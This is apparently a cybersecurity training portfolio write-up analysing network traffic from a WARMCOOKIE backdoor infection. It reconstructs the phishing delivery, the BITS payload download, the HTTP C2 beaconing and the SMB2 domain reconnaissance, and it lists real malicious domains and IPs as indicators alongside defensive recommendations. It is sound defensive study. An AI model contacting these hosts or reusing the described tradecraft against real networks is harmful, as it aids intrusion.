# Day 28: Wireshark — Full Network Intrusion Analysis (WARMCOOKIE)

**Portfolio:** 30 Days of Cybersecurity | Blue Team Track  
**Date:** April 28, 2026  
**Tools:** Wireshark, Kali Linux  
**Source:** malware-traffic-analysis.net — 2024-08-15  
**Malware Family:** WARMCOOKIE backdoor  
**Difficulty:** Advanced  
**Format:** Network Forensics / Multi-Stage Intrusion Analysis  

---

## Objective

Perform a complete multi-stage network intrusion analysis on a real-world WARMCOOKIE malware PCAP, reconstructing the full attack chain from initial delivery through C2 establishment and post-infection domain reconnaissance. This is the most advanced network forensics project in the portfolio.

---

## PCAP Overview

| Metric | Value |
|--------|-------|
| Source | malware-traffic-analysis.net 2024-08-15 |
| Malware family | WARMCOOKIE backdoor |
| Total packets | 18,189 |
| Capture duration | Approximately 1,962 seconds (33 minutes) |
| Infected host | 10.8.15.133 |
| Domain environment | lafontainebleu.org |
| Domain controller | WIN-JEGJIX7Q9RS.lafontainebleu.org (10.8.15.4) |

---

## Protocol Hierarchy

| Protocol | Percentage | Significance |
|---------|-----------|-------------|
| UDP | 15.0% | Background DNS and broadcast traffic |
| TCP | 84.5% | Primary attack and C2 traffic |
| TLS | 11.0% | Encrypted connections to Microsoft and Adobe services |
| HTTP | 3.6% | Malware delivery and C2 communication |
| SMB2 | 1.5% | Domain controller reconnaissance |

---

## IO Graph Analysis

The IO graph showed a massive burst of traffic in the first 200 seconds — peaking at 1.5k packets per second — followed by low steady-state traffic for the remainder of the capture. This pattern is consistent with initial infection activity (rapid file downloads, C2 check-in, domain reconnaissance) settling into persistent low-and-slow C2 beaconing.

---

## Attack Chain Reconstruction

### Stage 1: Initial Delivery — Fake Invoice

The infection began with the victim visiting a malicious URL hosted on `quote.checkfedexexp.com` — a fake FedEx-themed domain designed to impersonate a legitimate shipping notification.

**HTTP Stream Analysis:**
```
GET /managements?16553a25e45250a41fd5&endeds=MIGpq&JStx=59bf050d37df88a9...
Host: quote.checkfedexexp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/127.0.0.0

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="Invoice 876597035_003.zip"
Server: cloudflare
```

The server delivered a ZIP file named `Invoice 876597035_003.zip` containing a JavaScript dropper. The delivery server was hosted behind Cloudflare infrastructure — a common technique to protect attacker infrastructure from takedown and to appear more legitimate.

### Stage 2: WARMCOOKIE Payload Download — BITS Abuse

After the dropper executed, the infected host downloaded the WARMCOOKIE backdoor binary from `72.5.43.29` using Windows Background Intelligent Transfer Service (BITS).

**Key indicators:**
```
User-Agent: Microsoft BITS/7.8
GET /data/0f60a3e7baecf2748b1c8183ed37d1e4 HTTP/1.1
Host: 72.5.43.29

HTTP/1.1 200 OK
Content-Length: 159232
MZ....This program cannot be run in DOS mode.
```

The `MZ` header confirms the downloaded file is a **Windows PE executable** — the actual WARMCOOKIE malware binary (159 KB). Attackers abuse BITS because it is a trusted Windows service that runs with system privileges, bypasses many security controls, and can resume downloads after network interruptions.

### Stage 3: C2 Establishment

The C2 session to `72.5.43.29` began at 134 seconds and lasted until 1,962 seconds — over 30 minutes of active C2 communication. Three HTTP POST beacons were identified to the same IP on port 80.

**POST beacon characteristics:**
- Destination: `72.5.43.29:80`
- User-Agent: `Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)` — deliberately outdated IE6 string
- Cookie field contains long base64-encoded data — encrypted C2 commands

The fake IE6 User-Agent is a WARMCOOKIE signature — no legitimate browser has used Internet Explorer 6 since 2001. This immediately identifies the traffic as malware.

### Stage 4: Domain Reconnaissance via SMB2

After establishing C2, the malware connected to the domain controller via SMB2 and performed Active Directory reconnaissance:

| SMB2 Activity | Target | Significance |
|--------------|--------|-------------|
| Session Setup | WIN-JEGJIX7Q9RS (10.8.15.4) | Authentication to DC |
| Tree Connect | \\WIN-JEGJIX7Q9RS\IPC$ | IPC share — domain enumeration |
| Tree Connect | \\WIN-JEGJIX7Q9RS\sysvol | SYSVOL — Group Policy access |
| File Read | lafontainebleu.org\Policies\{31B2F340...}\gpt.ini | Group Policy template |

Reading SYSVOL and Group Policy files is a standard post-infection reconnaissance technique — the attacker maps the domain structure, identifies other machines via Group Policy Objects, and locates privileged accounts.

---

## Indicators of Compromise

| Type | Value | Classification |
|------|-------|---------------|
| Domain | quote.checkfedexexp.com | Malware delivery domain |
| IP | 104.21.55.70 | Delivery server (Cloudflare-hosted) |
| IP | 72.5.43.29 | WARMCOOKIE C2 server |
| File | Invoice 876597035_003.zip | Malware dropper ZIP |
| User-Agent | Microsoft BITS/7.8 | WARMCOOKIE download indicator |
| User-Agent | MSIE 6.0; Windows NT 5.1 | WARMCOOKIE C2 beacon indicator |
| Host IP | 10.8.15.133 | Infected workstation |
| DC | WIN-JEGJIX7Q9RS (10.8.15.4) | Domain controller accessed |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Evidence |
|-------------|------|---------|
| T1566.002 | Phishing: Spearphishing Link | Fake FedEx invoice delivery |
| T1059.007 | JavaScript | ZIP contained JavaScript dropper |
| T1197 | BITS Jobs | Microsoft BITS/7.8 payload download |
| T1071.001 | Application Layer Protocol | HTTP C2 communication |
| T1036 | Masquerading | Fake IE6 User-Agent string |
| T1021.002 | SMB/Windows Admin Shares | SMB2 access to IPC$ and SYSVOL |
| T1069 | Permission Groups Discovery | Group Policy file enumeration |
| T1482 | Domain Trust Discovery | Domain controller SYSVOL reconnaissance |

---

## Key Findings

### Finding 1: BITS Abuse for Payload Delivery
Using BITS (T1197) for malware download is a sophisticated evasion technique. BITS is a legitimate Windows service, its traffic blends with normal Windows Update activity, and many security tools do not inspect BITS traffic by default.

### Finding 2: Cloudflare Infrastructure Abuse
The delivery server was hosted behind Cloudflare, giving it a trusted IP reputation and complicating takedown requests. This is increasingly common in modern malware campaigns.

### Finding 3: 30-Minute Active C2 Session
The sustained 30-minute C2 session with POST beacons indicates an operator was actively controlling the machine during the capture — not just automated check-ins.

### Finding 4: Domain Controller Reconnaissance
SMB2 access to the DC's SYSVOL share within seconds of infection confirms WARMCOOKIE's automated reconnaissance capability — it maps the domain environment immediately after establishing C2.

---

## Defensive Recommendations

1. Alert on BITS downloads from non-Microsoft IPs — legitimate Windows Update never downloads from unknown hosting IPs
2. Block the fake IE6 User-Agent string at the web proxy — no legitimate traffic uses this string
3. Alert on outbound HTTP POST traffic to IPs with no established reputation
4. Monitor SMB2 connections from workstations to domain controllers outside of business hours
5. Deploy DNS filtering to block newly registered domains — quote.checkfedexexp.com was a newly created fake domain
6. Inspect ZIP attachments containing JavaScript — this is the most common initial access vector for WARMCOOKIE

---

## Skills Demonstrated

- Real-world malware PCAP analysis (WARMCOOKIE family)
- Multi-stage attack chain reconstruction
- BITS abuse identification and analysis
- HTTP stream inspection for malware delivery and C2
- SMB2 Active Directory reconnaissance analysis
- Cloudflare-hosted attacker infrastructure identification
- MITRE ATT&CK technique mapping (8 techniques)

---

## Files in This Repository

```
day-28-wireshark-intrusion-analysis/
├── README.md     
└── report.pdf    
```

Note: PCAP not included — download from malware-traffic-analysis.net (2024-08-15) with password: infected

---

*Part of the 30 Days of Cybersecurity portfolio project.*
